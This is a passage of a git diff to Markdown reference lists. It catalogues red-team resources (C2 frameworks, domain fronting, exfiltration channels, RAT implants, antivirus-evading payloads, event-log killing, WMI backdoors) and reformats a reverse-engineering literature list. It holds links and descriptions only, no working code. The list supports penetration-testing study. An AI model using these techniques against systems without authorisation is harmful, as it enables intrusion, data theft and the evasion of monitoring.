+* [MurDock - Mutable Universal Relay Document Kit](https://github.com/themson/MurDocK)
+
+  * The purpose of this tool is to provide a protocol independent framework that
+    contains a base set of features that can piggyback on top of any
+    collaborative web platform or service. The base docClient and docServer are
+    meant to be extended upon with Buffer classes written for individual web
+    services. These buffer classes can be plugged into the MurDock framework in
+    order to create a unique shell infrastructure that will always contains a
+    base set of features, as well as the ability to tunnel over any web
+    application traffic for which a buffer class has been constructed. The
+    framework can be extended to operate over lower level protocols if desired.
+
+* [PoshC2](https://github.com/nettitude/PoshC2)
+
+  * Powershell C2 Server and Implants
+
+* [FruityC2](https://github.com/xtr4nge/FruityC2)
+
+  * FruityC2 is a post-exploitation (and open source) framework based on the
+    deployment of agents on compromised machines. Agents are managed from a web
+    interface under the control of an operator.
+
+* [PlugBot-C2C](https://github.com/redteamsecurity/PlugBot-C2C)
+
+  * This is the Command & Control component of the PlugBot project
+
+* [How to Build a 404 page not found C2](https://www.blackhillsinfosec.com/?p=5134)
+* [404 File not found C2 PoC](https://github.com/theG3ist/404)
+* [Command and Control Using Active Directory](http://www.harmj0y.net/blog/powershell/command-and-control-using-active-directory/)
+* [C2 with twitter](https://pentestlab.blog/2017/09/26/command-and-control-twitter/)
+* [C2 with DNS](https://pentestlab.blog/2017/09/06/command-and-control-dns/)
+* [ICMP C2](https://pentestlab.blog/2017/07/28/command-and-control-icmp/)
+* [C2 with Dropbox](https://pentestlab.blog/2017/08/29/command-and-control-dropbox/)
+* [C2 with https](https://pentestlab.blog/2017/10/04/command-and-control-https/)
+* [C2 with webdav](https://pentestlab.blog/2017/09/12/command-and-control-webdav/)
+* [C2 with gmail](https://pentestlab.blog/2017/08/03/command-and-control-gmail/)
+* [“Tasking” Office 365 for Cobalt Strike C2](https://labs.mwrinfosecurity.com/blog/tasking-office-365-for-cobalt-strike-c2/)
+* [Simple domain fronting PoC with GAE C2 server](https://www.securityartwork.es/2017/01/31/simple-domain-fronting-poc-with-gae-c2-server/)
+* [Using WebDAV features as a covert channel](https://arno0x0x.wordpress.com/2017/09/07/using-webdav-features-as-a-covert-channel/)
+
+### Domains
+
+* Domain Fronting
+
+  * [FindFrontableDomains](https://github.com/rvrsh3ll/FindFrontableDomains)
+
+    * Search for potential frontable domains
+
+  * [High-reputation Redirectors and Domain Fronting](https://blog.cobaltstrike.com/2017/02/06/high-reputation-redirectors-and-domain-fronting/)
+  * [Blocking-resistant communication through domain fronting](https://www.bamsoftware.com/talks/fronting-pets2015/)
+  * [Camouflage at encryption layer: domain fronting](https://www.securityartwork.es/2017/01/24/camouflage-at-encryption-layer-domain-fronting/)
+  * [Domain Fronting - Infosec Institute](http://resources.infosecinstitute.com/domain-fronting/)
+  * [Simple domain fronting PoC with GAE C2 server](https://www.securityartwork.es/2017/01/31/simple-domain-fronting-poc-with-gae-c2-server/)
+
+    * In this entry we continue with domain fronting; on this occasion we will
+      explore how to implement a simple PoC of a command and control and
+      exfiltration server on Google App Engine (GAE), and we will see how to do
+      the domain fronting from Windows, with a VBS or PowerShell script, to hide
+      interactions with the C2 server.
+
+  * [TOR Fronting – Utilising Hidden Services for Privacy](https://www.mdsec.co.uk/2017/02/tor-fronting-utilising-hidden-services-for-privacy/)
+  * [Finding Domain frontable Azure domains - thoth / Fionnbharr (@a_profligate)](https://theobsidiantower.com/2017/07/24/d0a7cfceedc42bdf3a36f2926bd52863ef28befc.html)
+  * [Red Team Insights on HTTPS Domain Fronting Google Hosts Using Cobalt Strike](https://www.cyberark.com/threat-research-blog/red-team-insights-https-domain-fronting-google-hosts-using-cobalt-strike/)
+  * [Domain Fronting Via Cloudfront Alternate Domains](https://www.mdsec.co.uk/2017/02/domain-fronting-via-cloudfront-alternate-domains/)
+
+* Domain Tools
+
+  * [Domain Hunter](https://github.com/minisllc/domainhunter)
+
+    * Checks expired domains, bluecoat categorization, and Archive.org history
+      to determine good candidates for phishing and C2 domain names
+
+  * [AIRMASTER](https://github.com/t94j0/AIRMASTER)
+
+    * Use ExpiredDomains.net and BlueCoat to find useful domains for red team.
+
+  * [Chameleon](https://github.com/mdsecactivebreach/Chameleon)
+
+    * A tool for evading Proxy categorisation
+
+  * [CatMyFish](https://github.com/Mr-Un1k0d3r/CatMyFish)
+
+    * Search for categorized domain that can be used during red teaming
+      engagement. Perfect to setup whitelisted domain for your Cobalt Strike
+      beacon C&C. It relies on expireddomains.net to obtain a list of expired
+      domains. The domain availability is validated using checkdomain.com
+
+  * [Finding Frontable Domain](https://github.com/rvrsh3ll/FindFrontableDomains)
+
+* Domain Reputation Sites
+
+  * [Alien Vault](http://www.alienvault.com)
+  * [Isithacked?](http://www.isithacked.com)
+  * [Robtex](https://dns.robtex.com)
+  * [Scan4You](http://scan4you.net/)
+  * [Sucuri](http://sitecheck.sucuri.net/scanner/)
+  * [Trustedsource](http://www.trustedsource.org/)
+  * [urlQuery](http://urlquery.net/search.php)
+  * [URLVoid](http://www.urlvoid.com/scan/)
+  * [VirusTotal](https://www.virustotal.com/)
+  * [WOT](http://www.mywot.com/en/scorecard)
+  * [Zeltser BL](http://zeltser.com)
+
+* Redirectors
+
+  * [Apache2Mod Rewrite Setup](https://github.com/n0pe-sled/Apache2-Mod-Rewrite-Setup)
+  * [Redirecting Cobalt Strike DNS Beacons](http://www.rvrsh3ll.net/blog/offensive/redirecting-cobalt-strike-dns-beacons/)
+  * [High-reputation Redirectors and Domain Fronting](https://blog.cobaltstrike.com/2017/02/06/high-reputation-redirectors-and-domain-fronting/)
+  * [Cobalt Strike HTTP C2 Redirectors with Apache mod_rewrite - Jeff Dimmock](https://bluescreenofjeff.com/2016-06-28-cobalt-strike-http-c2-redirectors-with-apache-mod_rewrite/)
+
+### Egress/Exfiltration
+
+* Articles
+
+  * [Practical Comprehensive Bounds on Surreptitious Communication Over DNS](http://www.icir.org/vern/papers/covert-dns-usec13.pdf)
+  * [Exfiltration by encoding data in pixel colour values](https://www.pentestpartners.com/security-blog/exfiltration-by-encoding-data-in-pixel-colour-values/)
+  * [Data Sound Modulation POC](https://github.com/iiamit/data-sound-poc)
+  * [Hiding Malicious Traffic Under the HTTP 404 Error](https://blog.fortinet.com/2015/04/09/hiding-malicious-traffic-under-the-http-404-error)
+  * [Covert Channels in TCP/IP Protocol Stack - extended version-](https://eprints.ugd.edu.mk/10284/1/surveyAMBPselfArc.pdf)
+  * [A Survey of Covert Channels and Countermeasures in Computer Network Protocols](http://caia.swin.edu.au/cv/szander/publications/szander-ieee-comst07.pdf)
+    * Covert channels are used for the secret transfer of information.
+      Encryption only protects communication from being decoded by unauthorised
+      parties, whereas covert channels aim to hide the very existence of the
+      communication. Initially, covert channels were identified as a security
+      threat on monolithic systems i.e. mainframes. More recently focus has
+      shifted towards covert channels in computer network protocols. The huge
+      amount of data and vast number of different protocols in the Internet
+      seems ideal as a high-bandwidth vehicle for covert communication. This
+      article is a survey of the existing techniques for creating covert
+      channels in widely deployed network and application protocols. We also
+      give an overview of common methods for their detection, elimination, and
+      capacity limitation, required to improve security in future computer
+      networks.
+  * [Covert Timing Channels Based on HTTP Cache Headers - Video Presentation](https://www.youtube.com/watch?v=DOAG3mtz7H4)
+  * [Covert Timing Channels Based on HTTP Cache Headers - Paper](https://scholarworks.rit.edu/cgi/viewcontent.cgi?filename=0&article=1784&context=other&type=additional)
+  * [Blocking-resistant communication through domain fronting](https://www.bamsoftware.com/papers/fronting/)
+  * [Egressing Bluecoat with CobaltStike & Let's Encrypt](https://cybersyndicates.com/2016/12/egressing-bluecoat-with-cobaltstike-letsencrypt/)
+  * [Project Loki - Phrack 7-49](http://phrack.org/issues/49/6.html)
+    * This whitepaper is intended as a complete description of the covert
+      channel that exists in networks that allow ping traffic (hereon referred
+      to in the more general sense of ICMP_ECHO traffic --see below) to pass.
+  * [Escape and Evasion Egressing Restricted Networks - Tom Steele and Chris Patten](https://www.optiv.com/blog/escape-and-evasion-egressing-restricted-networks)
+
+* Talks
+
+  * [DIY Spy Covert Channels With Scapy And Python - Jen Allen - ANYCON 2017](http://www.irongeek.com/i.php?page=videos/anycon2017/diy-spy-covert-channels-with-scapy-and-python-jen-allen)
+  * [Goodbye Data, Hello Exfiltration - Itzik Kotler](https://www.youtube.com/watch?v=GwaIvm2HJKc)
+    * Penetration testing isn’t about getting in, it’s also about getting out
+      with the goodies. In this talk, you will learn how leverage commonly
+      installed software (not Kali Linux!) to exfiltrate data from networks.
+      Moving on to more advanced methods that combines encryption, obfuscation,
+      splitting (and Python). Last but not least, I’ll address data exfiltration
+      via physical ports and demo one out-of-the-box method to do it.
+    * [Slides](http://www.ikotler.org/GoodbyeDataHelloExfiltration_BSidesORL.pdf)
+  * [Itzik Kotler | Goodbye Data, Hello Exfiltration - BSides Orlando](https://www.youtube.com/watch?v=GwaIvm2HJKc)
+    * Penetration testing isn’t about getting in, it’s also about getting out
+      with the goodies. In this talk, you will learn how leverage commonly
+      installed software (not Kali Linux!) to exfiltrate data from networks.
+      Moving on to more advanced methods that combines encryption, obfuscation,
+      splitting (and Python). Last but not least, I’ll address data exfiltration
+      via physical ports and demo one out-of-the-box method to do it.
+  * [In Plain Sight: The Perfect Exfiltration Technique - Itzik Kotler and Amit Klein - HiTB2016](https://www.youtube.com/watch?v=T6PscV43C0w)
+    * In this session, we will reveal and demonstrate perfect exfiltration via
+      indirect covert channels (i.e. the communicating parties don’t directly
+      exchange network packets). This is a family of techniques to exfiltrate
+      data (low throughput) from an enterprise in a manner indistinguishable
+      from genuine traffic. Using HTTP and exploiting a byproduct of how some
+      websites choose to cache their pages, we will demonstrate how data can be
+      leaked without raising any suspicion. These techniques are designed to
+      overcome even perfect knowledge and analysis of the enterprise network
+      traffic.
+  * [How To Bypass Email Gateways Using Common Payloads by Neil Lines - BSides Manchester2017](https://www.youtube.com/watch?v=eZxWDCetqkE&index=11&list=PLcgqQkap1lNrOBNCXqpPqpPAqckxv0XhP)
+
+* Tools
+
+  * [PTP-RAT](https://github.com/pentestpartners/PTP-RAT)
+    * Exfiltrate data over screen interfaces
+
+### Empire
+
+* Articles
+
+  * [Hunting Red Team Empire C2 Infrastructure](http://www.chokepoint.net/2017/04/hunting-red-team-empire-c2.html)
+  * [Athena: The CIA’s RAT vs Empire](https://bneg.io/2017/05/22/athena-the-cias-rat-vs-empire/)
+
+* Customizing
+
+  * [Using PowerShell Empire with a Trusted Certificate](https://www.blackhillsinfosec.com/using-powershell-empire-with-a-trusted-certificate/)
+  * [How to Make Empire Communication profiles - bluescreenofjeff](https://github.com/bluscreenofjeff/bluscreenofjeff.github.io/blob/master/_posts/2017-03-01-how-to-make-communication-profiles-for-empire.md)
+  * [Empire – Modifying Server C2 Indicators](http://threatexpress.com/2017/05/empire-modifying-server-c2-indicators/)
+  * [Empire Domain Fronting](https://www.xorrior.com/Empire-Domain-Fronting/)
+  * [Empire without powershell](https://bneg.io/2017/07/26/empire-without-powershell-exe/)
+
+##### Hardware
+
+* [DigiDucky - How to setup a Digispark like a rubber ducky](http://www.redteamr.com/2016/08/digiducky/)
+* [Bash Bunny](https://hakshop.com/products/bash-bunny)
+* [How to Build Your Own Penetration Testing Drop Box - BHIS](https://www.blackhillsinfosec.com/?p=5156&)
+* [P4wnP1](https://github.com/mame82/P4wnP1)
+
+  * P4wnP1 is a highly customizable USB attack platform, based on a low cost
+    Raspberry Pi Zero or Raspberry Pi Zero W.
+
+* [Contents of a Physical Pentester Backpack](https://www.tunnelsup.com/contents-of-a-physical-pen-testers-backpack/)
+
+### Implants
+
+* [CheckPlease](https://github.com/Arvanaghi/CheckPlease)
+
+  * Implant-Security modules written in PowerShell, Python, Go, Ruby, C, C#,
+    Perl, and Rust.
+
+* [ThunderShell](https://github.com/Mr-Un1k0d3r/ThunderShell)
+
+  * ThunderShell is a Powershell based RAT that rely on HTTP request to
+    communicate. All the network traffic is encrypted using a second layer of
+    RC4 to avoid SSL interception and defeat network hooks.
+
+* [dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell)
+
+  * A Powershell client for dnscat2, an encrypted DNS command and control tool
+
+* [WMImplant](https://github.com/ChrisTruncer/WMImplant)
+
+  * WMImplant is a PowerShell based tool that leverages WMI to both perform
+    actions against targeted machines, but also as the C2 channel for issuing
+    commands and receiving results. WMImplant will likely require local
+    administrator permissions on the targeted machine.
+
+* [DNS-Persist](https://github.com/0x09AL/DNS-Persist)
+
+  * DNS-Persist is a post-exploitation agent which uses DNS for command and
+    control. The server-side code is in Python and the agent is coded in C++.
+
+* [BrainDamage](https://github.com/mehulj94/BrainDamage)
+
+  * A fully featured backdoor that uses Telegram as a C&C server
+
+* Inside a low budget
+
+### Infrastructure
+
+* General
+
+  * [How to Build a C2 Infrastructure with Digital Ocean – Part 1](https://www.blackhillsinfosec.com/build-c2-infrastructure-digital-ocean-part-1/)
+  * [Infrastructure for Ongoing Red Team Operations](https://blog.cobaltstrike.com/2014/09/09/infrastructure-for-ongoing-red-team-operations/)
+  * [Automated Red Team Infrastructure Deployment with Terraform - Part 1](https://rastamouse.me/2017/08/automated-red-team-infrastructure-deployment-with-terraform---part-1/)
+  * [6 RED TEAM INFRASTRUCTURE TIPS](https://cybersyndicates.com/2016/11/top-red-team-tips/)
+  * [Migrating Your infrastructure](https://blog.cobaltstrike.com/2015/10/21/migrating-your-infrastructure/)
+
+* Logging
+
+  * [Attack Infrastructure Log Aggregation and Monitoring](https://posts.specterops.io/attack-infrastructure-log-aggregation-and-monitoring-345e4173044e)
+
+### Payloads
+
+* [Malice](https://github.com/maliceio/malice)
+
+  * Malice's mission is to be a free open source version of VirusTotal that
+    anyone can use at any scale from an independent researcher to a fortune 500
+    company.
+
+* [Pupy](https://github.com/n1nj4sec/pupy)
+
+  * Pupy is an opensource, multi-platform Remote Administration Tool with an
+    embedded Python interpreter. Pupy can load python packages from memory and
+    transparently access remote python objects. Pupy can communicate using
+    different transports and have a bunch of cool features & modules. On
+    Windows, Pupy is a reflective DLL and leaves no traces on disk.
+
+* [RedSails](https://github.com/BeetleChunks/redsails)
+
+  * Python based post-exploitation project aimed at bypassing host based
+    security monitoring and logging.
+    [DerbyCon 2017 Talk](https://www.youtube.com/watch?v=Ul8uPvlOsug)
+
+* [stupid_malware](https://github.com/andrew-morris/stupid_malware)
+
+  * Python malware for pentesters that bypasses most antivirus (signature and
+    heuristics) and IPS using sheer stupidity
+
+* [Dragon: A Windows, non-binding, passive download / exec backdoor](http://www.shellntel.com/blog/2015/6/11/dragon-a-windows-non-binding-passive-downloadexec-backdoor)
+* [MetaTwin](https://github.com/minisllc/metatwin)
+
+  * The project is designed as a file resource cloner. Metadata, including
+    digital signature, is extracted from one file and injected into another.
+    Note: Signatures are copied, but no longer valid.
+  * [Blogpost](http://threatexpress.com/2017/10/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/)
+
+### Persistence Methods
+
+* [Staying Persistent in Software Defined Networks](https://www.blackhat.com/docs/us-15/materials/us-15-Pickett-Staying-Persistent-In-Software-Defined-Networks-wp.pdf)
+* [Phant0m: Killing Windows Event Log Phant0m: Killing Windows Event Log](https://artofpwn.com/phant0m-killing-windows-event-log.html)
+* [Invoke-Phant0m](https://github.com/hlldz/Invoke-Phant0m)
+
+  * This script walks thread stacks of Event Log Service process (spesific
+    svchost.exe) and identify Event Log Threads to kill Event Log Service
+    Threads. So the system will not be able to collect logs and at the same time
+    the Event Log Service will appear to be running.
+
+### Tactics
+
+* Ideas
+
+  * [unindexed](https://github.com/mroth/unindexed/blob/master/README.md)
+    * The site is constantly searching for itself in Google, over and over and
+      over, 24 hours a day. The instant it finds itself in Google search
+      results, the site will instantaneously and irrevocably securely delete
+      itself. Visitors can contribute to the public content of the site, these
+      contributions will also be destroyed when the site deletes itself.
+  * [Hiding your process from sysinternals](https://riscybusiness.wordpress.com/2017/10/07/hiding-your-process-from-sysinternals/)
+
+* Keying Payloads
+
+  * [Keying Payloads for Scripting Languages](https://adapt-and-attack.com/2017/11/15/keying-payloads-for-scripting-languages/)
+  * [GoGreen](https://github.com/leoloobeek/GoGreen/blob/master/README.md)
+    * This project was created to bring environmental (and HTTP) keying to
+      scripting languages. As its common place to use
+      PowerShell/JScript/VBScript as an initial vector of code execution, as a
+      result of phishing or lateral movement, I see value of the techniques for
+      these languages.
+
+* Lateral Movement
+
+  * WMI
+    * [Abusing Windows Management Instrumentation (WMI) to Build a Persistent, Asyncronous, and Fileless Backdoor](https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf)
+  * [Creeping on Users with WMI Events: Introducing PowerLurk](https://pentestarmoury.com/2016/07/13/151/)
+  * [PowerLurk](https://github.com/Sw4mpf0x/PowerLurk)
+    * PowerLurk is a PowerShell toolset for building malicious WMI Event
+      Subsriptions. The goal is to make WMI events easier to fire off during a
+      penetration test or red team engagement.
+  * [Windows Security Center: Fooling WMI Consumers](https://www.opswat.com/blog/windows-security-center-fooling-wmi-consumers)
+  * [CimSweep](https://github.com/PowerShellMafia/CimSweep)
+    * CimSweep is a suite of CIM/WMI-based tools that enable the ability to
+      perform incident response and hunting operations remotely across all
+      versions of Windows. CimSweep may also be used to engage in offensive
+      reconnaisance without the need to drop any payload to disk. Windows
+      Management Instrumentation has been installed and its respective service
+      running by default since Windows XP and Windows 2000 and is fully
+      supported in the latest versions of Windows including Windows 10, Nano
+      Server, and Server 2016.
+
+* Simulation
+
+  * [DumpsterFire](https://github.com/TryCatchHCF/DumpsterFire)
+    * [Slides](https://github.com/TryCatchHCF/DumpsterFire/raw/master/CactusCon_2017_Presentation/DumpsterFire_CactusCon_2017_Slides.pdf)
+    * The DumpsterFire Toolset is a modular, menu-driven, cross-platform tool
+      for building repeatable, time-delayed, distributed security events. Easily
+      create custom event chains for Blue Team drills and sensor / alert
+      mapping. Red Teams can create decoy incidents, distractions, and lures to
+      support and scale their operations. Turn paper tabletop exercises into
+      controlled "live fire" range events. Build event sequences ("narratives")
+      to simulate realistic scenarios and generate corresponding network and
+      filesystem artifacts.
+
+#### Code Injection
+
+* [injectAllTheThings](https://github.com/fdiskyou/injectAllTheThings/)
+
+  * Single Visual Studio project implementing multiple DLL injection techniques
+    (actually 7 different techniques) that work both for 32 and 64 bits. Each
+    technique has its own source code file to make it easy way to read and
+    understand.
+
+* [Inject All the Things - Shut up and hack](http://blog.deniable.org/blog/2017/07/16/inject-all-the-things/)
+
+### Pen Testing
+
+#### AIX
+
+* [AIX for Penetration Testers 2017 thevivi.net](https://thevivi.net/2017/03/19/aix-for-penetration-testers/)
+* [Hunting Bugs in AIX : Pentesting writeup](https://rhinosecuritylabs.com/2016/11/03/unix-nostalgia-hunting-zeroday-vulnerabilities-ibm-aix/)
+* [Penetration Testing Trends John Strand - Derbycon6](https://www.youtube.com/watch?v=QyxdUe1iMNk)
+
+#### Embedded
+
+* [War Stories on Embedded Security Pentesting IoT Building Managers and how to do Better Dr Jared - Derbycon7](https://www.youtube.com/watch?v=bnTWysHT0I4&index=8&list=PLNhlcxQZJSm-PKUZTYe1C94ymf0omysM3)
+
+#### SCADA/PLCs
+
+* [Industrial Control Systems : Pentesting PLCs 101 (Part 1/2)](https://www.youtube.com/watch?v=iGwm6-lyn2Y)
+* [Industrial Control Systems : Pentesting PLCs 101 (Part 2/2)](https://www.youtube.com/watch?v=rP_Jys1_OJk)
+* [Adventures in Attacking Wind Farm Control Networks - Jason Stagg](https://www.blackhat.com/docs/us-17/wednesday/us-17-Staggs-Adventures-In-Attacking-Wind-Farm-Control-Networks.pdf)
+* [Protocol Me Maybe? How to Date SCADA - Stephen Hilt](http://www.irongeek.com/i.php?page=videos/derbycon4/t124-protocol-me-maybe-how-to-date-scada-stephen-hilt)
+
+#### MainFrames
+
+* [Hacking Mainframes; Vulnerabilities in applications exposed over TN3270 - Dominic White](http://www.irongeek.com/i.php?page=videos/derbycon4/t217-hacking-mainframes-vulnerabilities-in-applications-exposed-over-tn3270-dominic-white)
+
+  * IBM System Z Mainframes are in regular use in Fortune 500 companies. Far
+    from being legacy these systems are running an actively maintained operating
+    system (z/OS). Applications on these often occupy roles critical to the
+    business processes they underpin, with much of the later technology built
+    around them, rather than replacing them. However, these systems are often
+    bypassed by security testing due to worried of availability or assumptions
+    about legacy. This talk will introduce you to assessing mainframe
+    applications, which turn out to be quite similar to web applications. For
+    this purpose we built a tool, Big Iron Recon & Pwnage (BIRP), to assist with
+    performing such assessments. Importantly, our research uncovered a family of
+    mainframe application vulnerabilities introduced by the TN3270 protocol. We
+    found numerous applications, but not all, vulnerable to these flaws.
+    Applications running within the two most popular transaction managers (CICS
+    and IMS) as well as one of IBM’s own applications. The tool released assists
+    with the exploitation of these flaws.
diff --git a/Draft/Reverse Engineering - REMath Literature.md b/source/Reverse-Engineering-REMath-Literature.md
old mode 100755
new mode 100644
similarity index 52%
rename from Draft/Reverse Engineering - REMath Literature.md
rename to source/Reverse-Engineering-REMath-Literature.md
index b5cf60b..ecf978b
--- a/Draft/Reverse Engineering - REMath Literature.md	
+++ b/source/Reverse-Engineering-REMath-Literature.md
@@ -1,17 +1,31 @@
-## Mechanization of Exploits 
-* https://github.com/REMath/literature_review/blob/master/mechanization_of_exploits.org 
+# Reverse Engineering Math and Literature Resources
+
+## Mechanization of Exploits
+
+* https://github.com/REMath/literature_review/blob/master/mechanization_of_exploits.org
+
+## Binary Analysis
+
+* Moflow BAP-based tools to do post-crash graph backtaint slicing, post-crash
+  forward symbolic emulation to look for more exploitable conditions, whitebox
+  fuzzing based in SAGE
+
+  * https://github.com/vrtadmin/moflow
 
-## Binary Analysis 
-* Moflow BAP-based tools to do post-crash graph backtaint slicing, post-crash forward symbolic emulation to look for more exploitable conditions, whitebox fuzzing based in SAGE 
- - https://github.com/vrtadmin/moflow
 * https://github.com/zardus/pyvex
-* Mcsema is a rewriting and static analysis framework based on LLVM 
- - https://github.com/trailofbits/mcsema
+* Mcsema is a rewriting and static analysis framework based on LLVM
+
+  * https://github.com/trailofbits/mcsema
+
 * https://github.com/bdcht/amoco
-* A tool that exports LLVM bitcode into a Datalog workspace 
- - https://github.com/plast-lab/llvm-datalog
-* Dagger is a decompilation framework based on LLVM 
- - http://dagger.repzret.org/
+* A tool that exports LLVM bitcode into a Datalog workspace
+
+  * https://github.com/plast-lab/llvm-datalog
+
+* Dagger is a decompilation framework based on LLVM
+
+  * http://dagger.repzret.org/
+
 * http://bap.ece.cmu.edu/, https://github.com/BinaryAnalysisPlatform/bap
 * http://dynamorio.org/
 * https://bitbucket.org/simona/mltk
@@ -23,7 +37,8 @@
 * https://bincoa.labri.fr/trac
 * http://www.jakstab.org/documentation
 * https://code.google.com/p/tree-cbass/
-* https://github.com/bitblaze-fuzzball/fuzzball (https://nebelwelt.net/blog/20140114-having_phun_with_SE.html)
+* https://github.com/bitblaze-fuzzball/fuzzball
+  (https://nebelwelt.net/blog/20140114-having_phun_with_SE.html)
 * https://code.google.com/p/decaf-platform/
 * http://esec-lab.sogeti.com/pages/Fuzzgrind
 * http://code.google.com/p/idaocaml/
@@ -35,126 +50,194 @@
 * http://eindbazen.net/2013/04/pctf-2013-cone-binary-250-2/
 * http://shell-storm.org/blog/Binary-analysis-Concolic-execution-with-Pin-and-z3/
 * An architecture-independent decompiler to LLVM IR
- - https://github.com/draperlaboratory/fracture
+
+  * https://github.com/draperlaboratory/fracture
+
 * DECAF - https://code.google.com/p/decaf-platform/
-* Binwalk: Firmware analysis tool 
- - http://binwalk.org/
+* Binwalk: Firmware analysis tool
+
+  * http://binwalk.org/
+
 * https://code.google.com/p/miasm/
 
+## Analysis of Communication Protocols
+
+* Netzob is an open source tool for reverse engineering, traffic generation and
+  fuzzing of communication protocols. It allows to infer the message format and
+  the state machine of a protocol through passive and active processes. The
+  model can afterward be used to simulate realistic and controllable trafic. -
+  http://www.netzob.org/
+* Communication protocols determine how network components interact with each
+  other. Therefore, the ability to derive a specification of a protocol can be
+  useful in various contexts, such as to support deeper black-box testing or
+  effective defense mechanisms. Unfortunately, it is often hard to obtain the
+  specification because systems implement closed (i.e., undocumented) protocols,
+  or because a time consuming translation has to be performed, from the textual
+  description of the protocol to a format readable by the tools. To address
+  these issues, we developed ReverX, a Java application that generates automata
+  for the language and protocol state machine from network traces. Since our
+  solution only resorts to interaction samples of the protocol, it is
+  well-suited to uncover the message formats and protocol states of closed
+  protocols and also to automate most of the process of specifying open
+  protocols. - https://code.google.com/p/reverx/
 
+## Intermediate Representations
 
-## Analysis of Communication Protocols 
-* Netzob is an open source tool for reverse engineering, traffic generation and fuzzing of communication protocols. It allows to infer the message format and the state machine of a protocol through passive and active processes. The model can afterward be used to simulate realistic and controllable trafic. - http://www.netzob.org/
-* Communication protocols determine how network components interact with each other. Therefore, the ability to derive a specification of a protocol can be useful in various contexts, such as to support deeper black-box testing or effective defense mechanisms. Unfortunately, it is often hard to obtain the specification because systems implement closed (i.e., undocumented) protocols, or because a time consuming translation has to be performed, from the textual description of the protocol to a format readable by the tools. To address these issues, we developed ReverX, a Java application that generates automata for the language and protocol state machine from network traces. Since our solution only resorts to interaction samples of the protocol, it is well-suited to uncover the message formats and protocol states of closed protocols and also to automate most of the process of specifying open protocols. - https://code.google.com/p/reverx/
+* An Intermediate Representation for Integrating Reverse Engineering Analyses
+  (1998)
 
+  * http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.47.2766
 
-## Intermediate Representations
-* An Intermediate Representation for Integrating Reverse Engineering Analyses (1998) 
- - http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.47.2766
-* REIL: A platform-independent intermediate representation of disassembled code for static code analys 
- - http://moflow.org/ref/REIL%20-%20A%20platform-independent%20intermediate%20representation%20of%20disassembled%20code%20for%20static%20code%20analysis.pdf
-* Relational Reverse Engineering Intermediate Language 
- - http://www2.in.tum.de/bib/files/sepp11precise.pdf
-* VinE Project Documentation 
- - http://bitblaze.cs.berkeley.edu/papers/vine.pdf
-* BIL 
- - http://bap.ece.cmu.edu/doc/bap.pdf
-* LLVM 
- - http://infoscience.epfl.ch/record/149975/files/x86-llvm-translator-chipounov_2.pdf , http://eurosys2013.tudos.org/wp-content/uploads/2013/paper/Anand.pdf
-* TSL: A System for Generating Abstract Interpreters and its Application to Machine-Code Analysis 
- - http://research.cs.wisc.edu/wpis/papers/toplas13-tsl-final.pdf
-* Combining Several Analyses into One OR What is a Good Intermediate Language for the Analysis of Executables? 
- - http://www.dagstuhl.de/mat/Files/12/12051/12051.SimonAxel.Slides.pdf
-* Jakstab uses an IR described in chapter two 
- - http://www.cs.rhul.ac.uk/home/kinder/papers/phdthesis.pdf
-* Wire ? A Formal Intermediate Language for Binary Analysis 
- - https://drive.google.com/file/d/0BymO5h8P3PgAakZqY1RQSldzRmM/edit?usp=sharing
-* Automated Synthesis of Symbolic Instruction Encodings from I/O Samples - http://research.microsoft.com/en-us/um/people/pg/public_psfiles/pldi2012.pdf
-* Towards A Binary Intermediate Language for Real-Time Embedded System by Jianqi Shi, Qin Li, Longfei Zhu, Xin Ye, Yanhong Huang, Huixing Fang and Fu Song 
- - http://research.sei.ecnu.edu.cn/~song/publications/MPiE14.pdf
-* RockSalt: Better, Faster, Stronger SFI for the x86 
- - http://www.cse.lehigh.edu/~gtan/paper/rocksalt.pdf
-
-## Alias / Value Analysis  
-* Alias Analysis for Assembly 
- - http://reports-archive.adm.cs.cmu.edu/anon/anon/usr/ftp/2006/CMU-CS-06-180R.pdf
-* Probabilistic Alias Analysis for ARM Executable Code 
- - https://drive.google.com/file/d/0BymO5h8P3PgAc29nUFBleGFtTnc/edit?usp=sharing
-* WYSINWYX: What You See Is Not What You Execute 
- - http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.76.637&rep=rep1&type=pdf
-* Static Analysis of x86 Executables by Johannes Kinder 
- - http://www.cs.rhul.ac.uk/home/kinder/papers/phdthesis.pdf
-* BDDStab: BDD-based Value Analysis of Binaries 
- - http://cs.au.dk/~amoeller/tapas2014/tapas2014_2.pdf
-* Static Analysis of x86 Assembly: Certification and Robustness Analysis 
- - http://dumas.ccsd.cnrs.fr/docs/00/63/64/45/PDF/Laporte.pdf 
-
-
-## Control Flow Recovery 
-* Alias / Value Analysis 
- - https://github.com/REMath/literature_review#alias--value-analysis
-* Alternating Control Flow Reconstruction 
- - http://dslab.epfl.ch/pubs/alternatingCFR.pdf
-* Refinement-based CFG Reconstruction from Unstructured Programs by Sebastien Bardin, Philippe Herrmann, and Franck Vedrine 
- - http://www.labri.fr/perso/fleury/download/papers/binary_analysis/long-final-vmcai-11.pdf
-* Control flow reconstruction from PowerPC binaries 
- - http://www2.in.tum.de/bib/files/mihaila09reconstruction.pdf
-* Interprocedural Analysis of Low-Level Code 
- - http://mediatum.ub.tum.de/doc/1006212/1006212.pdf
+* REIL: A platform-independent intermediate representation of disassembled code
+  for static code analys
+
+  * http://moflow.org/ref/REIL%20-%20A%20platform-independent%20intermediate%20representation%20of%20disassembled%20code%20for%20static%20code%20analysis.pdf
+
+* Relational Reverse Engineering Intermediate Language
+
+  * http://www2.in.tum.de/bib/files/sepp11precise.pdf
+
+* VinE Project Documentation
+
+  * http://bitblaze.cs.berkeley.edu/papers/vine.pdf
+
+* BIL
+
+  * http://bap.ece.cmu.edu/doc/bap.pdf
+
+* LLVM
+
+  * http://infoscience.epfl.ch/record/149975/files/x86-llvm-translator-chipounov_2.pdf
+    , http://eurosys2013.tudos.org/wp-content/uploads/2013/paper/Anand.pdf
+
+* TSL: A System for Generating Abstract Interpreters and its Application to
+  Machine-Code Analysis
+
+  * http://research.cs.wisc.edu/wpis/papers/toplas13-tsl-final.pdf
+
